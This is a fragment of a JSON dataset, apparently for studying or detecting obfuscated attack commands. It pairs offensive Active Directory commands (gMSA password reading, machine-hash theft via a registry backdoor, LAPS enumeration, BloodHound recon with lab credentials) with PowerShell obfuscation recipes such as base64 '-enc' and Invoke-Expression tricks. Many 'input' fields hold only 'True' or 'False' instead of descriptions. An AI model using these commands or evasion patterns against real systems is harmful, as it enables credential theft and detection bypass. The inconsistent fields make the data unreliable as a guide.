    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enumerating System Information, This command retrieves detailed information about the operating system, including version, build, and system architecture.",
    "origin_cmd": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "/GMSAPasswordReader --AccountName jkohler",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Knowing the users password Group Managed Service Accounts, So, if gMSA is being used, find if it has special privileges and also check if you have permissions to read the password of the services. You can read this password with GMSAPasswordReader:",
    "origin_cmd": "/GMSAPasswordReader --AccountName jkohler"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.",
    "origin_cmd": "Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)",
    "origin_cmd": "Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
